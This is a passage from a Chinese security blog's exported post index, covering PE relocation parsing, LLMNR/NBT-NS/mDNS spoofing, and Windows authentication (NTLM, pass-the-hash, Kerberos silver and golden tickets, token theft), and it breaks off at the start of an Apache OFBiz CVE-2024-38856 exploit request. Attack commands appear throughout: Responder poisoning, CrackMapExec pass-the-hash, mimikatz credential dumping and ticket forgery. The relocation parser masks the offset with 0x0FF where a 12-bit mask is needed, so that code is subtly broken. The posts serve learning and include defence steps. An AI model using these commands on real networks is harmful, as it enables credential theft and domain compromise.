pRelocation=(PIMAGE_BASE_RELOCATION)((uintptr_t)pRelocation+pRelocation->SizeOfBlock);\n    }\n    return rvaList;\n}\n```\n\n然后中间的部分高四位表示的是类型。低十二位表示的重定位地址\n\n解析代码\n\n```cpp\nlist<DWORD> CPeUtil::GetReLocation() {\n    list<DWORD> rvaList;\n    IMAGE_DATA_DIRECTORY relocationDirectory =pOptionHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n    PIMAGE_BASE_RELOCATION pRelocation=(PIMAGE_BASE_RELOCATION)(RavToFoa(relocationDirectory.VirtualAddress)+buffer);\n\n    while (1){\n        if(pRelocation->VirtualAddress==0){\n            break;\n        }\n        //获取到指向元素的指针\n        DWORD* prelocOffset =(DWORD*)((uintptr_t)pRelocation + sizeof(IMAGE_BASE_RELOCATION));;\n        //获取块元素个数\n        DWORD number= (pRelocation->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/2;\n        for(int i=0;i<number;i++){\n            //判断高两位是否为3\n            if((*prelocOffset & 0x3000)== 0x3000){\n                //取低几位,并加上基址\n                DWORD rva =((*prelocOffset) & 0x0FF) + pRelocation->VirtualAddress;\n                rvaList.push_back(rva);\n            }\n\n            prelocOffset++;\n        }\n        pRelocation=(PIMAGE_BASE_RELOCATION)((uintptr_t)pRelocation+pRelocation->SizeOfBlock);\n    }\n    return rvaList;\n}\n```\n\n扩展学习，可以看看另一位师傅 的文章：\n\n[PE文件结构从初识到简单shellcode注入](https://tttang.com/archive/1553/)\n\n## Reference\n+ https://tttang.com/archive/1553\n\n","tags":["二进制","Windows"],"categories":["Windows"]},{"title":"LLMNR\\NBT-NS\\MDNS欺骗","url":"/2024/10/10/LLMNR与NBTNS和MDNS欺骗/","content":"\n\n\n\n\n\n\n\nLLMNR、NetBIOS、MDNS 本质是对DNS的扩充，应用在内网中的DNS解析(局域网内未得到DNS响应等场景)\n\nLLMNR\\NetBIOS\\MDNS欺骗是中间人攻击，适合来获取凭证，如Net-NTLM Hash的获取 ,所以单独\n\n开了一篇来学习，不过Responder 已经集成了各种服务场景下的LLMNR\\NetBIOS\\MDNS 欺骗\n\n## LLMNR\n​\tLLMNR(Link-Local Multicast Name Resolution) 是用于同一本地链路上的，基于DNS协议的一个协议，同一局域网中的主机可通过该协议去解析其他主机名\n\n是一种用于在局域网中解析主机名到IP地址的协议。它通常用于替代基于DNS的主机名解析，特别是在没有DNS服务器或者DNS服务器不可用的情况下。（如小型局域网没有搭建专门的DNS服务器）\n\n\n\n​\t从 Windows Vista 开始支持 LLMNR ，Linux 系统也通过 systemd 实现了此协议，同时 LLMNR 也支持 IPv6。\n\n\n\n\n\n现在机器解析域名，查询顺序如下：\n\n1. 本地hosts 文件解析\n2. 使用DNS解析\n3. 使用LLMNR解析\n4. NetBIOS名称服务（NBT-NS）\n5. mDNS解析\n\n\n\n\n\nLLMNR解析过程：\n\n1. 先检查本地NetBios缓存\n2. 没有则向IPv4的组播地址224.0.0.252(IPv6的组播地址ff02::fb)组播LLMNR协议数据包\n3. 收到该广播的数据包，若是要找的主机，则向广播主机单播一个返回数据包\n\n\n\n组播：224.0.0.0/4 是保留给多播通信的地址范围，其中 224.0.0.0 到 224.0.0.255 是局部网络控制多播地址，它们用于在本地网络中传输控制消息，不能被路由器转发到其他网络\n\nLLMNR协议工作在UDP 5355端口\n\nLLMNR（Link-Local Multicast Name Resolution）主要适用于以下几种场景和应用环境：\n\n1. 小型网络环境：\n    - LLMNR最常见的应用场景是在小型局域网中，例如家庭网络、小办公室网络或者少量设备组成的网络环境。在这些环境中，通常没有专门的DNS服务器，LLMNR可以提供一种简单而有效的主机名解析和服务发现机制。\n2. 无线局域网（Wi-Fi）：\n    - 在无线局域网中，LLMNR能够帮助设备发现并解析其他设备的主机名，例如打印机、共享文件夹或其他网络服务。这对于用户来说提供了更方便的使用体验，无需依赖静态IP地址或复杂的网络配置。\n3. 临时网络配置：\n    - 在临时或临时性质的网络配置中，比如在展览会、会议或其他临时集会中，LLMNR可以帮助设备快速地发现并与其他设备进行通信，而无需事先配置复杂的网络参数。\n4. 无法连接到正常DNS服务器的情况：\n    - 当设备无法连接到正常的DNS服务器时，例如因为网络故障或DNS服务器不可用，LLMNR可以作为一种备用的名字解析机制，仍然允许设备间进行基本的主机名解析和服务发现。\n5. 零配置网络（Zero Configuration Networking）：\n    - LLMNR常被用作零配置网络中的一部分，这种网络使设备可以在不需要手动配置的情况下自动发现和交互。它与其他零配置技术如Bonjour（mDNS）结合使用，为设备提供全面的自动化网络体验。\n\n\n\n\n\n这种就跟ARP协议非常的相像，也容易遭受中间人攻击\n\nLLMNR的欺骗手段和ARP欺骗差不多\n\n​\t首先，LLMNR是UDP进行广播，所以不需要先ARP欺骗监听流量\n\n​\t其次，由于它基于DNS协议，所以结构也与DNS相近，也就是说需要LLMNR广播包的特征码来构造响应包，才会接受响应。\n\n​\t能触发LLMNR协议的主要就是smb共享，或者ping这种，只要基于链路层的访问就有机会用到LLMNR去解析\n\n<img src=\"/img/24-10-10/1.png\" >\n\n\n\n但是由于毒化后对方要使用链路层服务才会起作用，所以smb共享是主要方式\n\n\n\n在触发LLMNR协议进行广播后，就需要做出响应来进行欺骗\n\n\n\n对方将接收到的响应包中的地址作为要解析的地址，写入NetBios缓存。在访问对应的内网服务时候就被解析到了攻击者的地址上。\n\n\n\n看到另外一位师傅的陈述：\n\n> 我们甚至不需要对方去触发LLMNR广播查询，只要我们模拟受害者ip向局域网组播了查询数据包（对方至少得加入广播组），再把响应数据包发给受害者，就能实现LLMNR毒化。但是似乎在每次使用链路层服务时都会寻找，不管之前是否有查找过。（另外写脚本的时候也碰到了一点问题，用socket发送数据包的话，如果要设置UDP广播就无法设置从数据包中读取IP头，即伪造对方IP和发送广播包两者不能共存，不知道是不是写法的问题，网上也没找到有办法。）\n>\n\n最好的毒化方法就是像responder那样监听广播中的LLMNR广播数据包，再进行单播欺骗。\n\n> （llmnr实在很少使用，正常的局域网中要连接其他局域网内主机都直接用dns完成了，像llmnr大概只能去查询一些刚加进局域网，还未来得到和dns服务器交互，且存在于组播中的主机，所以要完成欺骗也要一点社工手段使对方使用llmnr服务）\n>\n\n\n\n<img src=\"/img/24-10-10/2.png\" >\n\n这里可以研究一下，怎么写脚本构造数据包\n\n## NetBIOS\nNetbios(Network Basic Input Output System)：网络基本输入输出系统，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。严格来说，Netbios是一种应用程序接口(API)\n\n<img src=\"/img/24-10-10/3.png\" >\n\n​\t系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名解析为相应IP地址，几乎所有的局域网都是在NetBIOS协议的基础上工作的。**NetBIOS名也是计算机的标识名称，主要用于局域网内计算机的互访**。NetBIOS的工作流程就是正常的机器名解析查询应答过程。在Windows操作系统中，默认情况下在安装 TCP/IP 协议后会自动安装NetBIOS。\n\n\n\n服务类型：\n\n根据上图，可以看到三种服务：\n\n| 服务类型 | 端口 | 具体描述 |\n| --- | --- | --- |\n| NetBIOS name(NetBIOS名称服务) | UDP 137 | 鉴别资源。程序、主机都有独特的NetBIOS名称 |\n| NetBIOS datagram（NetBIOS数据报服务) | UDP 138 | 无连接地数据报发送到特定的地点、组、整个局域网 |\n| NetBIOS session （NetBIOS 会话服务） | TCP 139 | 提供面向连接、可靠、完全双重的信息服务 |\n\n\nNetBIOS name 为其他两个服务的基础。\n\n\n\n上面提到过DNS解析失败后会经过Net-BIOS名称服务（NBT-NS\\NBNS）在本地进行名称解析\n\nNBNS:\n\n\n\nNetBios names 负责对netbios名字和ip之间进行相互的解析 类似于dns  \n计算机名称到IP地址的管理方式  \n\n\n工作方式：\n\n+ 位于同一工作组的电脑之间利用广播功能进行计算机名的管理  \n电脑在启动或者是联网的时候，会查询在局域网下是否是存在具有相同的NetBios名称的主机\n+ 利用WINS(Windows 因特网名称服务)管理NetBios名称  \nWINS服务器用于记录计算机NetBios名称和IP地址的对应关系，供局域网计算机查询，系统启动的时候会将自己的NetBios名称和IP地址的对应发送给WINS服务器\n+ 类似于DHCP分配IP地址，第二种里面说的WINS服务器就类似于DNS服务器，将NetBios的名称和ip之间相互对应\n\n\n\n简单来说，一般计算机都有一个NetBIOS名，NBNS就在局域网内查询解析到对应NetBIOS名的主机\n\n数据包：\n\n<img src=\"/img/24-10-10/4.png\" >\n\n相关命令\n\n```powershell\nNBTSTAT列出来指定名称的名称和IP以及会话表等等  \nNBTSTAT -A ip地址  查询该IP所对应的NetBios名称，命令的本质是向该IP地址对应的137端口发送查询的信息  \nnbtstat -c 进行查看缓存   \nAdd name  \nAdd group name  \nDelete name  \nFind name\n```\n\n渗透中的应用\n\n使用其进行信息收集：\n\nwindows:\n\n```shell\nnbtstat -n \nnbtscan\n```\n\n查看本地的缓存的netbios 表\n\nLinux:\n\n使用nmap进行扫描，扫描的是udp 137端口 NetBIOS name 服务\n\n```shell\nnmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4\n```\n\n## MDNS\n​\t是一种类似于LLMNR的协议，用于解析本地域名到IP地址。它也用于设备发现和服务发现，特别是在局域网内。\n\n​\t在没有标准DNS服务器的环境中，mDNS允许设备通过查询多播地址224.0.0.251（IPv4）或FF02::FB（IPv6）来解析以.local结尾的域名。mDNS的重要方面包括一个生存时间（TTL）值，指示记录的有效性，以及一个QU位，用于区分单播和多播查询。在安全方面，mDNS实现必须验证数据包的源地址是否与本地子网一致。\n\n\n\n使用端口：UDP 5353\n\n\n\n工作原理：\n\n（1）设备使用多播地址发送mDNS查询，通常在UDP端口5353上。  \n（2）其他设备可以回复mDNS响应，提供所需的服务或资源的IP地址\n\n\n\n\n\n也就是当解析不到域名(如test) 的时候，会向局域网组播(test.local)等待其他主机响应\n\n组播地址稍微与LLMNR不一样\n\n数据包如下：\n\n<img src=\"/img/24-10-10/5.png\" >\n\n\n\n\n\n## Spoofing Attack 欺骗攻击\n有时候可以称之为Poisoning Attacks 投毒攻击\n\n#### Responder\n这里欺骗使用现成的工具：Responder\n\n[https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)\n\n主要作用还是来获取Net-NTLM Hash\n\n原理：使用LLMNR\\NBT-NS\\MDNS 欺骗， 在使用SMB解析不存在的域名时，使其指向我们的攻击机，\n\n在伪造的SMB服务上获取Net-NTLM Hash\n\nkali自带，但是需要监听网卡，所以将kali与受害者放置在同一个局域网\n\n```shell\nresponder -I eth0 -A\n```\n\n-I :指定网卡\n\n<img src=\"/img/24-10-10/6.png\" >\n\n在受害机器上面执行,触发SMB （当然假如我们拿下了受害者机器，如果没有拿下可能就要使用一些社工手段让对方执行）\n\n```shell\nnet use \\\\yyjccc\n```\n\n<img src=\"/img/24-10-10/7.png\" >\n\n在攻击机上面就能捕获到Net-NTLM Hash\n\n\n\n<img src=\"/img/24-10-10/8.png\" >\n\n\n\n#### msf\n1.欺骗\n\n```shell\nauxiliary/spoof/nbns/nbns\\_response\n```\n\n2.捕获\n\n```powershell\nuse auxiliary/server/capture/http\\_ntlm\nuse auxiliary/server/capture/smb\n```\n\n还有很多协议 的欺骗和投毒：https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/wpad-spoofing\n\n## 防御\n1. 禁用NetBIBOS和LLMNR\n\n\n\nNetBIBOS：本地连接 → 属性 → Internet协议版本4（TCP/IPv4） → 属性 → 高级\n\n\n\nLLMNR：本地计算机策略 > 计算机配置 > 管理模板 > 网络 > DNS客户端 -> 关闭多播名称解析 ->启用\n\n\n\n\n\n2.设置端口访问策略\n\n防火墙直接禁用端口流量\n\nTCP 139、TCP 5355 和 UDP 5355等等\n\n或者将默认端口改成一些不会引起攻击者注意的高端口，即将端口重定向。这种重定向的方法修改注册表里面的PortNumber修改即可\n\n```plain\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\Wds\\rdpwd\\Tds\\tcp]\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-Tcp]\n```\n\n给这几个端口配置IPsec安全策略\n\n## Reference\n+ https://0xfay.github.io/posts/LLMNR%E6%8A%95%E6%AF%92#llmnr%E6%8A%95%E6%AF%92%E8%BF%87%E7%A8%8B\n+ https://yinhaoqin.blog/%E5%9F%9F%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%9F%BA%E7%A1%80%E5%8D%8F%E8%AE%AE/Netbios%E7%9A%84%E6%A2%B3%E7%90%86/\n+ https://xz.aliyun.com/t/9714\n\n","tags":["域渗透","Windows","协议","网络安全"],"categories":["Windows"]},{"title":"Windows认证机制","url":"/2024/09/19/Windows认证机制/","content":"\n\n\n\n\n\n# Windows认证机制\n\n\n\n​\tWindows 的认证机制也是一项基础，通过本文你能大致了解Windows认证机制，其中涉及常见的名词如NTLM哈希，PTH ,Kerberos协议，黄金票据、白银票据等等，希望师傅们看完能基本了解其含义和及其原理 \n\n\n## Windows本地认证\n密码存储路径：%SystemRoot%\\system32\\config\\sam\n\n\n\n### NTLM Hash\nNTLM Hash 是长度为32位由数字和字母组成的hash，支持Net NTLM 认证协议及本地认证\n\n+ Windows本身不存储用户的明文密码\n+ 当用户登录时候，会与本地SAM中的NTLM hash进行比较\n+ 在NTLM Hash 之前还存在LM Hash\n\n\n\n**生成**\n\n<img src=\"/img/24-9-19/1.png\" >\n\n\n\n```python\nfrom passlib.hash import nthash\nh=nthash.hash('admin')\n```\n\n计算过程\n\n如计算 admin的 NTLM Hash\n\n1. hex(16进制编码)  -> 61646d696e\n2. Unicode  -> 610064006d0069006e00\n3. MD4   -> 209c6174da490caeb422f3fa5a7ae634\n\n\n\n### 本地认证流程\n1. Windows Logon Process (即 winlogon.exe),是Windows NT 用户登录程序，用于管理用户登录和退出\n2. LSASS 用于微软Windows系统的安全机制。用于本地安全和登录策略\n\n\n\n### LM Hash\n**计算过程**\n\n1. 将所有小写字母转为大写字母\n2. 将密码转为16进制，分两组，填充为14个字符，空余位使用0x00字符填补\n3. 将密码分割为两个7个字节的的块\n4. 将每组转化为比特流，不足58bit的时候在左边加0\n5. 将比特流按照7比特一组，分出8组，末尾加0\n6. 将每组转化为16进制作为被加密的值，使用DES加密，使用字符串\"KGS!@#%\" 作为Key(0x4B47532140232425)，得到8个结果，每个结果转化为16进制\n\n若密码不超过7字节，后面一半是固定的：AA-D3-B4-35-B5-14-04-EE\n\n7. 连接两个加密字符串，得到LM哈希\n\n\n\n\n\n\n\n## Windows 网络认证\n**背景**：\n\n在内网渗透中，经常会遇到工作组，工作组环境是一个逻辑上的网络环境(工作区) ，隶属于工作组的机器之间违法相互建立一个完美的信任机制，只能点对点，是比较落后的认知方式，没有信任机构\n\n假设A主机与B主机属于同一个工作组环境，A想访问B上面的资源，需要将一个存在于B主机上的账户凭证发送给B,经过认证才能访问B\n\n常见的服务：SMB服务  端口445\n\n\n\n### NTLM协议\n即NT LAN Manager协议\n\n\n\n#### 概述\n早期的SMB协议在网络传输明文口令，后来出现LAN Manager Challenge/Response 验证机制，简称LM，但因为简单很容易就会被破解\n\n后面提出了WindowsNT挑战/响应验证机制，称之为NTLM 。现在已经有了更新的NTLMv2以及Kerberos验证体系\n\n\n\n#### Challenge/Response\n1. **第一步 协商**\n\n客户端在这一步向服务器确认协议版本，是v1还是v2 ...\n\n\n\n2. **第二步 质询**\n\n    服务端向客户端发送响应包\n\n服务器接收到请求后生成一个16位的随机数，称之为“Challenge” 使用登录用户名对应的NTLM Hash加密加密 Challenge 生成Challenge1。同时，生成Challenge1后，将Challenge(16位随机字符）发送给客户端   // Net NTLM Hash = NTLM Hash( Challenge)\n\n客户端接收到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response ,然后将Response发送到服务端,这个Response 也就是Net-NTLM Hash\n\n3. **第三步 验证**\n\n客户端会发送一个响应包\n\n服务端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过\n\n\n\n注意：每一次产生的Chanllenge都不同\n\n流程如图：\n\n<img src=\"/img/24-9-19/2.png\" >\n\n\n\n#### NTLM v2 协议\nNTLM v1 与NTLM v2 最显著的区别就是Challenge 与加密算法不同，共同点就是加密的原料都是NTLM Hash\n\n\n\n**差异**\n\n+ Chanllenge v1 的是有8位 ，v2的有16位\n+ Net-NTLM Hash:  加密算法 v1使用的DES ,v2的加密算法主要是HMAC-MD5\n\n\n\n#### Pass The Hash\n即PTH  (哈希传递)\n\n**介绍**\n\n哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术\n\n在获取不到明文密码，破解不了NTLM Hash的情况下进行横向移动\n\n\n\n**条件**\n\n+ <font style=\"color:#DF2A3F;\">被认证的主机能够访问到服务器</font>\n+ <font style=\"color:#DF2A3F;\">需要知道被传递认证的用户名</font>\n+ <font style=\"color:#DF2A3F;\">需要被传递认证用户的NTLM Hash</font>\n\n<font style=\"color:#DF2A3F;\"></font>\n\n**原理**\n\n<font style=\"color:#DF2A3F;\"> </font>其实知道了NTLM协议的认证的流程，原理就很简单，发送给服务端的Resposne是通过NTLM Hash 和 Chanllenge 生成的，因此直接使用Hash 就可以生成正确的Response\n\n 这也是正常的NTLM 认证流程\n\n\n\n**工具**\n\n**常见的工具有：**\n\n+ Smbmap\n+ CrackMapExec\n+ Smbexec\n+ Metasploit\n+ ........\n\n\n\n如使用CrackMapExec\n\n```shell\ncme smb 192.168.3.5 -u administrator -H dab7de8feecac65faf9fdc6cac3a9 -x whoami\n```\n\n****\n\n## 域认证\n### Kerberoes协议\n\n\n#### Active Directory\n**概念**\n\nActive Directory存储了有关网络对象的信息，并且让管理员能快速查找和使用这些信息。Active Directory 使用了结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织\n\n<font style=\"color:#DF2A3F;background-color:rgb(249, 250, 251);\">网络对象分为：用户、用户组、计算机、域、组织单位以及安全策略等</font>\n\n\n\n**作用**\n\n服务器及其客户端计算机管理、用户管理、资源管理、桌面配置、应用系统支撑\n\n\n\n\n\n#### Kerberoes\nKerberos是一种网络认证协议，设计目标是通过密钥系统为客户机和服务器应用程序提供认证服务。无需基于主机地址的信任，不需要网络上所有主机的网络安全。并假定网络上传送的数据包可以被任意读取、修改插入数据。在上面情况下，Kerberos作为一种可信任的第三方认证服务，通过传统的密码技术（共享密钥）执行认证服务\n\n涉及到三个角色：Client、Server、KDC(Key Distribution Center) = DC (域控)\n\n\n\n**KDC**\n\n+ AD (account database):存储所有client的白名单，只有存在于白名单的Client才能顺利申请到TGT\n+ Authentication Service( AS ): 为client 生成TGT的服务\n+ Ticket Grantig Service（TGS）: 为Client 生成某个服务的ticket 的服务\n\n\n\n关系如图：<img src=\"/img/24-9-19/3.png\" >\n\n**<font style=\"color:#DF2A3F;\">域认证流程</font>**\n\n\n\n**其中涉及 的密钥加密一般都是 使用对应机器的 NTLM Hash 加密**\n\n\n\n**第一次通信**\n\n概述：client 向 kerberos 服务请求，希望获取访问权限，kerberos 服务器首先判断client是否可信，也就是通过白名单和黑名单，通过后AS返回TGT给client\n\n<img src=\"/img/24-9-19/4.png\" >\n\n具体流程：\n\n① 客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳（AS_REQ）  \n②KDC当中的AS（Authentication Server）接收请求（AS是KDC中专门用来认证客户端身份的认证服务器）后去kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性；  \n③ 如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回响应给客户端，其中包含两部分内容：\n\n+ 第一部分内容称为TGT，他叫做票据授予票据，客户端后面的流程需要使用TGT去KDC中的TGS（票据授予中心）获取访问网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该客户端的Name，IP，当前时间戳，客户端  \n**即将访问的TGS的Name，TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)**。整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。\n+ 第二部分内容是使用客户端密钥（域控默认存储了所有机器的密钥，client,server）加密的一段内容，其中包括用于**客户端和TGS间通信的Session_key(CT_SK),客户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳** 。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。\n\n至此，第一次通信完成。\n\n\n\n**第二次通信**\n\n概述：_client 得到了TGT 后 继续向kerberos请求 ,希望获取server的权限，kerberos通过TGT 判断client是否拥有权限，然后给client访问server的权限的ticket_\n\n<img src=\"/img/24-9-19/5.png\" > \n\n具体流程：\n\n客户端行为：  \n①客户端使用CT_SK (SessionKey加密将自己的客户端信息发送给KDC，其中包括客户端名，IP，时间戳；  \n②客户端将自己想要访问的Server服务以明文的方式发送给KDC；  \n③客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；\n\n\nTGS行为：  \n\t① 此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的Server服务IP查看当前kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束。如果存在，继续接下来的认证。  \n\t②TGS使用自己的密钥将TGT中的内容进行解密，此时他看到了经过AS认证过后并记录的用户信息，一把Session_KEY即CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。  \n③如果时延正常，则TGS会使用CK_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。  \n④此时KDC将返回响应给客户端，响应内容包括：\n\n+ 第一部分：用于客户端访问网络服务的使用Server密码加密的ST（Servre Ticket），其中包括客户端的Name，IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信的CS_SK（Session Key）。\n+ 第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，AS已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。\n\n至此，第二次通信完成。\n\n**第三次通信**\n\n概述：_此时的客户端收到了来自KDC（TGS）的响应，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中的ST是由Server密码加密的，客户端无法解密），检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请求。\n\n<img src=\"/img/24-9-19/6.png\" >\n\n\n\n\n\n**具体流程**\n\n客户端：  \n\t① 客户端使用CK_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）作为第二部分内容都发送给服务端。  \n\n\n服务端：  \n\n​\t① 服务器此时收到了来自客户端的请求，他会使用自己的密钥，即Server密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会使用数字证书证明自己身份）。\n\n​\t至此，第三次通信完成。此时也代表着整个kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的进行整个网络通信了。\n\n\n\n**总结**\n\n​\t整个kerberos认证的过程较为复杂，三次通信中都使用了密钥，且密钥的种类一直在变化，并且为了防止网络拦截密钥，这些密钥都是临时生成的Session Key，即他们只在一次Session会话中起作用，即使密钥被劫持，等到密钥被破解可能这次会话都早已结束。  \n\t这为整个kerberos认证过程保证了较高的安全性。以下补充两个kerberos认证的整体流图，一个是kerberos认证的时序图，一个是kerberos认证的示意图，望能加深kerberos认证印象~~  \n**示意图**：\n\n<img src=\"/img/24-9-19/7.png\" > \n\n<img src=\"/img/24-9-19/8.png\" > \n\n\n\n#### 白银票据（Silver Ticket）\n特点：\n\n+ 不需要域KDC进行交互,(不需要拥有域账号)\n+ 需要知道目标服务的（对应计算机名的）NTLM Hash （条件）\n+ 只能针对对应的一个服务，不能访问所有的服务\n\n\n\n概述：Ticket = Server Hash ( Server Session Key + Client Info + end Time )\n\n当拥有Server Hash  时候,我们就可以伪造一个KDC认证的一个Ticket.\n\n其中Server Session Key 是 KDC 生成的 用于服务器和客户端通信的会话key,也就是随机字符串，所以可以进行任意伪造\n\n\n\n\n\n\n\n\n\n**伪造**\n\nMimikatz\n\n+ kerberos::list :列出票据\n+ kerberos::purge  :清除票据\n\n\n\n```plain\nmimikazt.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" >log.txt\n```\n\n\n\n\n\n伪造票据： mimikatz \"kerberod::golden  /domain:<域名> /sid:<域sid> /target:<目标服务器主机名>  /service:<服务类型>  /rc4:<NTLM Hash> /user:<用户名> /ptt\" exit\n\n\n\n+ (/ptt 注入到内存)\n+ 用户名可以随意\n\n\n\n\n\n只能针对服务器上面的某些服务进行伪造，伪造服务类型如下：\n\n<img src=\"/img/24-9-19/9.png\" >\n\n\n\n**防御**\n\n+ 尽量保证服务器凭证不被窃取\n+ 开启PAC（Privileged Attribute Certificate）特权属性证书保护功能，PAC主要是规定服务器将票据发送给kerberos服务，由kerberos服务验证票据是否有效\n\n\n\n开启方式：将注册表中HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControl\\Lsa\\Kerberos\\Parameters中的ValidateKdcPacSignature 设置为1\n\n\n\n\n\n#### 黄金票据(Golden Ticket)\n特点/条件：\n\n1. 需要与KDC通信\n2. 需要krbtgt 用户的hash (也就是KDC hash)\n\n\n\n可以不断伪造TGT，然后根据TGT 拿到对应的Ticket ,再去访问服务\n\n\n\n\n\n伪造：mimikatz \"kerberod::golden  /domain:<域名> /sid:<域sid>   /rc4:<KRBTGT  NTLM Hash> /user:<用户名> /ptt\" exit\n\n\n\n\n\n## Access Token\nAccess Token(访问令牌），它是一个描述进程或者线程安全上下文的一个对象。不同用户登录计算机后，都会生成一个Access Token ,这个Token 在用户创建进程或者线程时候会被使用，不断拷贝。（对应着A创建进程，而B无法访问）\n\n\n\n种类：主令牌、模拟令牌\n\n\n\n一般情况下，用户双击运行一个程序，都会拷贝explorer.exe的Access Token\n\n当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除\n\n\n\n**组成**\n\n+ 用户账户的安全标识符 （SID）\n+ 用户所属组的SID\n+ 用于标识当前登录会话的登录SID\n+ 用户或用户组所拥有的权限列表\n+ 所有者SID\n+ 访问控制列表\n+ 访问令牌的来源\n+ 令牌是主要令牌还是模拟令牌\n+ 限制SID的可选列表\n+ 目前的模拟等级\n+ 其他统计数据\n\n\n\n#### SID\nSecurity Identifiers 安全标识符  是一个唯一的字符串，他可以表示一个账户、一个用户组、或者是一次登录。通常他还有一个SID固定列表，例如：Everyone\n\n\n\nSID 的表现形式：\n\n1. 域SID -用户ID\n2. 计算机SID-用户ID\n3. SID列表都会存储在域控的AD或者计算机本地账户数据库中\n\n\n\n\n\n\n\n#### Token 令牌伪造\nAccess Token 产生过程：\n\n每个进程创建的时候会根据登录会话权限由LSA （Local Security Authority）分配一个Token （如果CreateProcess时自己指定了Token，LSA会用该Token,否则就用父进程Token 的一份拷贝）\n\n\n\n只有计算机重启，才会清空令牌，那么可以使用多种工具查看目前系统上存在的模拟令牌：\n\n+ Incognito\n+ Powershell -Invoke-TokenManipulation.ps1\n+ Cobalt Strike -steal_token\n+ Mimkatz 中的 token::list\n\n\n\nMSF 模块：\n\n<img src=\"/img/24-9-19/10.png\" >\n\n\n\n\n\n## Reference\n+ [https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/](https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/)\n\n\n\n\n\n\n\n","tags":["域渗透","Windows安全","内网"],"categories":["Windows"]},{"title":"Apache OFBiz目录遍历导致RCE(CVE-2024-38856)","url":"/2024/08/09/Apache-OFBiz目录遍历导致RCE-CVE-2024-38856/","content":"\n\n\n\n# Apache OFBiz目录遍历导致RCE(CVE-2024-38856)\n\n\n\n### 环境搭建\n下载地址： [https://ofbiz.apache.org/download.html](https://ofbiz.apache.org/download.html)\n下载的是17.02版本（下载的是17.02版本（代码有点区别但是能复现漏洞，建议还是18版本） \n\n然后在build.gradle 中设置jvm 调式参数\n```java\nList jvmArguments = ['-Xms128M', '-Xmx1024M','-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005']\n```\n<img src=\"/img/24-8-9/1.png\" >\n\n 构建项目：\n```powershell\n./gradlew cleanAll loadAll\n```\n这时候会编译出jar\n\n直接运行\n```powershell\n./gradlew ofbiz\n```\n不需要等待到100%\n\n访问：[https://localhost:8443/accounting/control/main](https://localhost:8443/accounting/control/main)\n\n### poc:\n```powershell\nPOST /webtools/control/forgotPassword;/ProgramExport HTTP/1.1\nHost:127.0.0.1:8443\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 